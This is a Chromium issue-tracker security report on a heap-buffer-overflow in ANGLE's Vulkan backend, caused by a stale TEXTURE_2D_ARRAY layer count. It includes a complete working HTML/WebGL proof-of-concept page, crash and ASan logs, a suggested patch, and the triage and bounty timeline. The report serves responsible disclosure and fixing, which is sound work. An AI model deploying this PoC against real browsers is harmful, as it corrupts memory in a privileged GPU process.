# ANGLE: Heap-Buffer-Overflow in ANGLE Vulkan Backend via TEXTURE_2D_ARRAY Layer Count Mismatch

| Field | Value |
|-------|-------|
| **Issue ID** | [501476576](https://issues.chromium.org/issues/501476576) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals>GPU>ANGLE |
| **Platforms** | Linux, Mac, Windows, ChromeOS |
| **Reporter** | ca...@gmail.com |
| **Assignee** | zm...@google.com |
| **Created** | 2026-04-11 |
| **Bounty** | $17,000.00 |

## Description

## VULNERABILITY DETAILS

### Summary

A heap-buffer-overflow vulnerability exists in ANGLE's Vulkan backend (`TextureVk.cpp`, `vk_helpers.cpp`) when a `TEXTURE_2D_ARRAY` texture's layer count is reduced via `texImage3D` and subsequently `generateMipmap()` triggers image respecification. The compatibility check in `IsTextureLevelDefinitionCompatibleWithImage()` fails to detect the layer count change because for `TEXTURE_2D_ARRAY` textures, `getLevelExtents()` always returns `depth=1` regardless of how many layers the image has. As a result, `mRedefinedLevels` is never set for the redefined level, and `stageSelfAsSubresourceUpdates()` stages a `VkImageCopy` with the stale old `mLayerCount` (e.g., 64) against a newly created image with fewer layers (e.g., 1), causing `vkCmdCopyImage` to write far past the end of the destination image's allocated memory.

### Overview

In ANGLE's Vulkan backend, `IsTextureLevelDefinitionCompatibleWithImage()` in `TextureVk.cpp` compares the new level definition against the existing VkImage using `image.getLevelExtents()`. For `TEXTURE_2D_ARRAY` textures, the per-level extents always have `depth=1` (layers are stored separately in `mLayerCount`). Consequently, when the layer count is changed — e.g., from 64 to 1 — the sizes still compare equal, the level is deemed "compatible", and `mRedefinedLevels` is not updated. When `generateMipmap()` subsequently triggers `respecifyImageStorage()`, `stageSelfAsSubresourceUpdates()` stages `VkImageCopy` operations using the stale old `mLayerCount` (64). A new VkImage is then created with only 1 layer, and when `flushStagedUpdates()` executes those copies, `vkCmdCopyImage` attempts to copy 64 layers into a 1-layer destination — producing a heap-buffer-overflow.

### Detail

The vulnerability involves two interacting code paths:

**1. Compatibility check bypass** — Layer count changes are invisible to the compatibility check:

```
// third_party/angle/src/libANGLE/renderer/vulkan/TextureVk.cpp:92
return size == image.getLevelExtents(imageLevelIndexVk) &&
       intendedFormatID == image.getIntendedFormatID() &&
       actualFormatID == image.getActualFormatID();

```
```
// third_party/angle/src/libANGLE/renderer/vulkan/vk_helpers.cpp:6976
gl::Extents ImageHelper::getLevelExtents(LevelIndex levelVk) const
{
    uint32_t width  = std::max(mExtents.width >> levelVk.get(), 1u);
    uint32_t height = std::max(mExtents.height >> levelVk.get(), 1u);
    uint32_t depth  = std::max(mExtents.depth >> levelVk.get(), 1u);
    return gl::Extents(width, height, depth);
}

```

For `TEXTURE_2D_ARRAY`, `mExtents.depth` is always 1 (asserted at line 5816), with layers stored in `mLayerCount`. So reducing layers from 64→1 produces the same extents `{W, H, 1}` in both old and new definitions — the change is deemed "compatible" and `mRedefinedLevels` is NOT set for the redefined level.

**2. Stale mLayerCount used to stage image copy:**

Because `mRedefinedLevels` is not set for level 0, `stageSelfAsSubresourceUpdates()` does not skip it. The function stages a `VkImageCopy` directly from the old layer count stored in `mLayerCount` (still 64 at this point):

```
// third_party/angle/src/libANGLE/renderer/vulkan/vk_helpers.cpp:9793
const gl::ImageIndex index =
    gl::ImageIndex::Make2DArrayRange(levelGL.get(), 0, mLayerCount);  // Uses stale 64!

stageSubresourceUpdateFromImage(prevImage.get(), index, levelVk, gl::kOffsetZero,
                                getLevelExtents(levelVk), mImageType);

```
```
// third_party/angle/src/libANGLE/renderer/vulkan/vk_helpers.cpp:9452-9453
copyToImage.dstSubresource.baseArrayLayer = index.hasLayer() ? index.getLayerIndex() : 0;
copyToImage.dstSubresource.layerCount     = index.getLayerCount();  // Stores stale 64

```

The old VkImage (64 layers) is moved to `prevImage` via `copyStateAndMoveStorageFrom()`:

```
// third_party/angle/src/libANGLE/renderer/vulkan/vk_helpers.cpp:9689-9757
void ImageHelper::copyStateAndMoveStorageFrom(ImageHelper *other)
{
    // ...
    mLayerCount = other->mLayerCount;  // Line 9732: copies old layer count to prevImage
    // ...
    // Reset information for other (invalid) image:
    other->mCurrentAccess = ImageAccess::Undefined;  // Line 9746
    other->mImageSerial   = kInvalidImageSerial;     // Line 9752
    // ... but other->mLayerCount is NOT reset here.
}

```

After `copyStateAndMoveStorageFrom`, `this->mLayerCount` on the source ImageHelper still holds 64 — because the compatibility check never marked level 0 as redefined, `stageSelfAsSubresourceUpdates` has no signal to use any other value. The staged `VkImageCopy` records `layerCount=64`. Then a new VkImage is created with 1 layer and `flushStagedUpdates()` executes the copy.

In SwiftShader's `copySingleAspectTo()` (VkImage.cpp:420), the for-loop at line 515 iterates `layerCount` (64) times. In debug builds, the ASSERT at line 528 catches this. In release builds, the ASSERT is compiled out and the `memcpy` writes 63 extra layers past the allocated memory.

### Trigger Conditions

1. Create a `TEXTURE_2D_ARRAY` texture with a large layer count (e.g., 64 layers) and `LINEAR` filter (1 mip level)
2. Draw and call `gl.finish()` to flush the image to the GPU (materializes the VkImage with 64 layers)
3. Redefine level 0 with fewer layers (e.g., 1 layer) via `texImage3D` — this is considered "compatible" because `getLevelExtents()` returns `depth=1` for 2D arrays regardless of layer count, so `mRedefinedLevels` is not updated
4. Call `generateMipmap()` — since the old image has only 1 mip level but now needs multiple levels, `respecifyImageStorage()` is triggered
5. `stageSelfAsSubresourceUpdates()` stages a `VkImageCopy` with the stale `mLayerCount` (64), then a new image is created with 1 layer
6. Draw and `gl.finish()` to flush the staged updates — `vkCmdCopyImage` copies 64 layers into a 1-layer image → heap-buffer-overflow

## Version

### Reproduced Version

- `main` branch latest commit (2026/04/10): `f870b7893adc664604830556d59f4e5c615805f1`
- Chromium 149.0.7785.0

## Reproduction Case

### Release Build

```
chrome --headless=new --no-sandbox --disable-gpu --use-gl=angle --use-angle=swiftshader poc.html

```

Result (GPU process crash; `--in-process-gpu` added below to capture output inline):

```
[INFO:CONSOLE] "Renderer: ANGLE (Google, Vulkan 1.3.0 (SwiftShader Device (Subzero) (0x0000C0DE)), SwiftShader driver)"
[INFO:CONSOLE] "Step 1: texImage3D 256x256x64, err=0"
[INFO:CONSOLE] "Step 2: flush done, err=0"
[INFO:CONSOLE] "Step 3: redefined to 1 layer, err=0"
[INFO:CONSOLE] "Step 4: generateMipmap, err=0"
[INFO:CONSOLE] "Step 5: draw+finish, err=0"
Received signal 11 SEGV_ACCERR 387c00505000
#0 base::debug::CollectStackTrace()
#1 base::debug::StackTrace::StackTrace()
#2 base::debug::(anonymous namespace)::StackDumpSignalHandler()
#3 (/usr/lib/x86_64-linux-gnu/libc.so.6+0x4532f)
#4 (/usr/lib/x86_64-linux-gnu/libc.so.6+0x198c88) -- memcpy
#5 <unknown>
#6 <unknown>
#7 <unknown>
#8 <unknown>
#9 <unknown>
Exit code: -11

```

The crash occurs in the GPU process (separate from the renderer). With `--in-process-gpu` the browser exits immediately; without it the browser process survives the GPU crash and hangs waiting for GPU reconnect.

### Debug Build

```
chrome --headless=new --no-sandbox --disable-gpu --use-gl=angle --use-angle=swiftshader poc.html

```

Result:

```
[INFO:CONSOLE] "Renderer: ANGLE (Google, Vulkan 1.3.0 (SwiftShader Device (Subzero) (0x0000C0DE)), SwiftShader driver)"
[INFO:CONSOLE] "Step 1: texImage3D 256x256x64, err=0"
[INFO:CONSOLE] "Step 2: flush done, err=0"
[INFO:CONSOLE] "Step 3: redefined to 1 layer, err=0"
[INFO:CONSOLE] "Step 4: generateMipmap, err=0"
[INFO:CONSOLE] "Step 5: draw+finish, err=0"
../../third_party/swiftshader/src/Vulkan/VkImage.cpp:528 ABORT: ASSERT((dstLayer + copySize) < dstImage->end())
Exit code: -6

```
### ASan Build (Release)

```
chrome --headless=new --no-sandbox --disable-gpu --use-gl=angle --use-angle=swiftshader poc.html

```

Result:

```
[INFO:CONSOLE] "Renderer: ANGLE (Google, Vulkan 1.3.0 (SwiftShader Device (Subzero) (0x0000C0DE)), SwiftShader driver)"
[INFO:CONSOLE] "Step 1: texImage3D 256x256x64, err=0"
[INFO:CONSOLE] "Step 2: flush done, err=0"
[INFO:CONSOLE] "Step 3: redefined to 1 layer, err=0"
[INFO:CONSOLE] "Step 4: generateMipmap, err=0"
[INFO:CONSOLE] "Step 5: draw+finish, err=0"
==2194290==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x750c7e7ac917 at pc 0x5d88060a40ae bp 0x750c5cb7aad0 sp 0x750c5cb7a290
WRITE of size 262144 at 0x750c7e7ac917 thread T43
    #0 in __asan_memcpy
    #1 in vk::Image::copySingleAspectTo(vk::Image*, VkImageCopy2 const&) const third_party/swiftshader/src/Vulkan/VkImage.cpp
    #2 in vk::CommandBuffer::submit(vk::CommandBuffer::ExecutionState&) third_party/swiftshader/src/Vulkan/VkCommandBuffer.cpp:2390:12
    #3 in vk::Queue::submitQueue(vk::Queue::Task const&) third_party/swiftshader/src/Vulkan/VkQueue.cpp:104:42
    #4 in vk::Queue::taskLoop(marl::Scheduler*) third_party/swiftshader/src/Vulkan/VkQueue.cpp:156:4
0x750c7e7ac917 is located 0 bytes after 1048855-byte region [0x750c7e6ac800,0x750c7e7ac917)
allocated by thread T23 (Chrome_InProcGp)
SUMMARY: AddressSanitizer: heap-buffer-overflow in __asan_memcpy
==2194290==ABORTING
Exit code: 1

```
### ASan Build (Debug)

The debug ASan build aborts early with an ODR violation unrelated to this bug and cannot be used to reproduce.

### PoC Code

```
<!DOCTYPE html>
<html>
<head><title>ANGLE 2D Array Texture Layer Count Mismatch PoC</title></head>
<body>
<canvas id="c" width="64" height="64"></canvas>
<script>
// PoC: Heap-buffer-overflow via layerCount mismatch in ANGLE Vulkan staged updates
//
// Bug: In ANGLE's Vulkan backend, when a TEXTURE_2D_ARRAY's layer count
// is reduced and then generateMipmap triggers image respecification,
// stageSelfAsSubresourceUpdates() uses the stale mLayerCount (old value)
// because IsTextureLevelDefinitionCompatibleWithImage() does not compare
// layer counts for array textures, leaving mRedefinedLevels unset.
// This causes vkCmdCopyImage to copy N layers to a 1-layer image → OOB write.

const canvas = document.getElementById('c');
const gl = canvas.getContext('webgl2');
if (!gl) { document.title = 'FAIL_NO_WEBGL2'; throw 'No WebGL2'; }

const ext = gl.getExtension('WEBGL_debug_renderer_info');
if (ext) console.log('Renderer: ' + gl.getParameter(ext.UNMASKED_RENDERER_WEBGL));

const vs = `#version 300 es
in vec4 a_pos;
void main() { gl_Position = a_pos; }`;
const fs = `#version 300 es
precision mediump float;
precision mediump sampler2DArray;
uniform sampler2DArray u_tex;
out vec4 color;
void main() { color = texture(u_tex, vec3(0.5, 0.5, 0.0)); }`;

function createShader(type, src) {
    const s = gl.createShader(type);
    gl.shaderSource(s, src);
    gl.compileShader(s);
    if (!gl.getShaderParameter(s, gl.COMPILE_STATUS)) throw gl.getShaderInfoLog(s);
    return s;
}

const prog = gl.createProgram();
gl.attachShader(prog, createShader(gl.VERTEX_SHADER, vs));
gl.attachShader(prog, createShader(gl.FRAGMENT_SHADER, fs));
gl.linkProgram(prog);
gl.useProgram(prog);
gl.uniform1i(gl.getUniformLocation(prog, 'u_tex'), 0);

const buf = gl.createBuffer();
gl.bindBuffer(gl.ARRAY_BUFFER, buf);
gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1,1,-1,-1,1,1,1]), gl.STATIC_DRAW);
gl.enableVertexAttribArray(0);
gl.vertexAttribPointer(0, 2, gl.FLOAT, false, 0, 0);

const ORIG_LAYERS = 64;
const W = 256, H = 256;

// Step 1: Create TEXTURE_2D_ARRAY with 64 layers, LINEAR filter = 1 VkImage level
const tex = gl.createTexture();
gl.bindTexture(gl.TEXTURE_2D_ARRAY, tex);

const pixels = new Uint8Array(W * H * ORIG_LAYERS * 4);
for (let i = 0; i < pixels.length; i += 4) {
    pixels[i] = 0xFF; pixels[i+1] = 0; pixels[i+2] = 0; pixels[i+3] = 0xFF;
}
gl.texImage3D(gl.TEXTURE_2D_ARRAY, 0, gl.RGBA8, W, H, ORIG_LAYERS, 0, gl.RGBA, gl.UNSIGNED_BYTE, pixels);

gl.texParameteri(gl.TEXTURE_2D_ARRAY, gl.TEXTURE_MIN_FILTER, gl.LINEAR);
gl.texParameteri(gl.TEXTURE_2D_ARRAY, gl.TEXTURE_MAG_FILTER, gl.LINEAR);
gl.texParameteri(gl.TEXTURE_2D_ARRAY, gl.TEXTURE_WRAP_S, gl.CLAMP_TO_EDGE);
gl.texParameteri(gl.TEXTURE_2D_ARRAY, gl.TEXTURE_WRAP_T, gl.CLAMP_TO_EDGE);

console.log('Step 1: texImage3D ' + W + 'x' + H + 'x' + ORIG_LAYERS + ', err=' + gl.getError());

// Step 2: Draw + finish → creates VkImage (1 level, 64 layers)
gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
gl.finish();
console.log('Step 2: flush done, err=' + gl.getError());

// Step 3: Redefine level 0 to 1 layer (compatible! Vk depth=1 for 2D arrays)
gl.texImage3D(gl.TEXTURE_2D_ARRAY, 0, gl.RGBA8, W, H, 1, 0, gl.RGBA, gl.UNSIGNED_BYTE,
              new Uint8Array(W * H * 4));
console.log('Step 3: redefined to 1 layer, err=' + gl.getError());

// Step 4: generateMipmap → triggers respecification → OOB copy
gl.generateMipmap(gl.TEXTURE_2D_ARRAY);
console.log('Step 4: generateMipmap, err=' + gl.getError());

// Step 5: Force flush of staged updates
gl.texParameteri(gl.TEXTURE_2D_ARRAY, gl.TEXTURE_MIN_FILTER, gl.LINEAR_MIPMAP_LINEAR);
gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
gl.finish();
console.log('Step 5: draw+finish, err=' + gl.getError());

document.title = 'DONE';
</script>
</body>
</html>

```
## Suggested Patch

The root cause is that `IsTextureLevelDefinitionCompatibleWithImage()` in `TextureVk.cpp` never compares layer counts. For `TEXTURE_2D_ARRAY`, `getLevelExtents()` always returns `depth=1` regardless of `mLayerCount`, so a layer-count-only redefinition passes the compatibility check silently. The fix is to add a `layerCount` parameter to the function and compare it against `image.getLayerCount()`.

```
--- a/third_party/angle/src/libANGLE/renderer/vulkan/TextureVk.cpp
+++ b/third_party/angle/src/libANGLE/renderer/vulkan/TextureVk.cpp
@@ -80,14 +80,17 @@ bool IsTextureLevelDefinitionCompatibleWithImage(const vk::ImageHelper &image,
                                                  gl::LevelIndex textureLevelIndexGL,
                                                  const gl::Extents &size,
                                                  angle::FormatID intendedFormatID,
-                                                 angle::FormatID actualFormatID)
+                                                 angle::FormatID actualFormatID,
+                                                 uint32_t layerCount)
 {
     if (!IsTextureLevelInAllocatedImage(image, textureLevelIndexGL))
     {
         return false;
     }
 
     vk::LevelIndex imageLevelIndexVk = image.toVkLevel(textureLevelIndexGL);
-    return size == image.getLevelExtents(imageLevelIndexVk) &&
-           intendedFormatID == image.getIntendedFormatID() &&
-           actualFormatID == image.getActualFormatID();
+    return size == image.getLevelExtents(imageLevelIndexVk) &&
+           layerCount == image.getLayerCount() &&
+           intendedFormatID == image.getIntendedFormatID() &&
+           actualFormatID == image.getActualFormatID();
 }
 
@@ -2627,9 +2631,15 @@ angle::Result TextureVk::redefineLevel(...)
         if (mImage->valid())
         {
             TextureLevelAllocation levelAllocation = ...;
+            // For array textures, size.depth is the new layer count (the depth parameter
+            // of texImage3D maps to layers for TEXTURE_2D_ARRAY).  Compare it against the
+            // image's existing layer count so a layer-count-only change is treated as
+            // incompatible and mRedefinedLevels is correctly updated.
+            const uint32_t newLayerCount = gl::IsArrayTextureType(index.getType())
+                                           ? static_cast<uint32_t>(size.depth)
+                                           : mImage->getLayerCount();
             TextureLevelDefinition levelDefinition =
                 IsTextureLevelDefinitionCompatibleWithImage(
-                    *mImage, levelIndexGL, size, format.getIntendedFormatID(),
-                    format.getActualImageFormatID(getRequiredFormatSupport()))
+                    *mImage, levelIndexGL, size, format.getIntendedFormatID(),
+                    format.getActualImageFormatID(getRequiredFormatSupport()), newLayerCount)
                     ? TextureLevelDefinition::Compatible
                     : TextureLevelDefinition::Incompatible;

```
#### Explanation

With this fix, calling `texImage3D(TEXTURE_2D_ARRAY, 0, ..., W, H, 1, ...)` on a texture whose VkImage was created with 64 layers passes `newLayerCount = 1` (from `size.depth`). Inside the function, `1 == image.getLayerCount()` evaluates as `1 == 64` → `false`, so the level is marked `Incompatible`. `TextureRedefineLevel` then sets `mRedefinedLevels` for level 0. When `stageSelfAsSubresourceUpdates()` is later called, level 0 appears in `skipLevelsAllFaces` and is skipped — no stale 64-layer `VkImageCopy` is ever staged, and the overflow cannot occur.

#### Alternative Approaches

1. **Reset `other->mLayerCount` in `copyStateAndMoveStorageFrom()`**: After copying `mLayerCount` to `this`, reset `other->mLayerCount` to 0. This is defense-in-depth but does not address the root cause: `stageSelfAsSubresourceUpdates()` would then stage a zero-layerCount copy (invalid per the Vulkan spec) rather than catching the mismatch early. This approach alone is insufficient.
2. **Clamp `layerCount` in `stageSelfAsSubresourceUpdates()`**: Use `std::min(mLayerCount, prevImage->get().getLevelCount())` or similar. This is also a band-aid: it masks the symptom without preventing the logically incorrect staged update (copying stale data from a redefined level).
3. **Combine both**: Fix the compatibility check (this patch) AND add a defensive DCHECK in `stageSelfAsSubresourceUpdates()` that asserts the staged layer count does not exceed the source image's layer count. This is the most robust approach.

### Credit Information

Reporter credit: Junyoung Park(@candymate) of KAIST Hacking Lab

## Attachments

- [poc.html](attachments/poc.html) (text/html, 3.6 KB)

## Timeline

### pe...@google.com (2026-04-13)

If the POC provided is actually valid on Android then this bug should be a s0 not an s1.

### ch...@google.com (2026-04-13)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2026-04-13)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security Impact hotlist or the Severity field, and remove the ReleaseBlock hotlist.

### ch...@google.com (2026-04-13)

Setting Priority to P1 to match Severity s1. To ensure SLOs are tracked correctly, priority must match or exceed severity.

### jr...@google.com (2026-04-13)

Reproduced the debug build SwiftShader `ASSERT` on Linux with ToT Chromium, which does suggest an OOB `vkCmdCopyImage` coming from ANGLE.
I don't have an Android debug build of Chromium right now but seems reasonable to assume it would affect Android too, so bumping to `S0` as per [comment #2](https://issues.chromium.org/issues/501476576#comment2).

### ch...@google.com (2026-04-14)

This is a critical security issue. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Severity field or update the Security Impact hotlist, and remove the ReleaseBlock label.

### ch...@google.com (2026-04-14)

Setting Priority to P0 to match Severity s0. To ensure SLOs are tracked correctly, priority must match or exceed severity.

### ge...@google.com (2026-04-14)

ANGLE Vulkan is not used in Chrome production builds. Marking as SecurityImpact-None.

### pe...@google.com (2026-04-17)

(Angle vulkan is not used in Android production builds but is used on other skus)

ANGLE vulkan is only shipping on configs that have a GPU sandbox. This automatically means s1.

It is not shipping or finching on unsandboxed Android devices. (so not s0)

### sy...@chromium.org (2026-05-05)

Removing Security\_Impact-None, since ANGLE/Vulkan does ship on ChromeOS.

@reporter, does this still reproduce?

### zm...@google.com (2026-05-05)

This is partially addressed by https://chromium-review.git.corp.google.com/c/angle/angle/+/7814277.

Let me see if we need to further tighten up code.

### ca...@gmail.com (2026-05-05)

> @reporter, does this still reproduce?

I'm currently building chrome to check this. I'll let you know when it's finished.

> Status: Duplicate of 502886159.

Is 502886159 reported earlier than this report? I think the issue number suggests no.

### ca...@gmail.com (2026-05-05)

> @reporter, does this still reproduce?

Checked release and release\_asan builds - just confirmed that <https://chromium-review.git.corp.google.com/c/angle/angle/+/7814277> fixes the bug.

### sp...@google.com (2026-05-13)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $17000.00 for this report.

Rationale for this decision:
Baseline. Memory corruption in a highly privileged process (e.g. GPU, network processes) 


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### ch...@google.com (2026-05-20)

This is sufficiently serious that it should be merged to M149. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M149. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.

Security Merge Request:

Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

### ch...@google.com (2026-05-20)

**M149** merge request created. **Please update [crbug/514928082](https://crbug.com/514928082) to have this merge reviewed.**

### eb...@google.com (2026-08-13)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/501476576)*
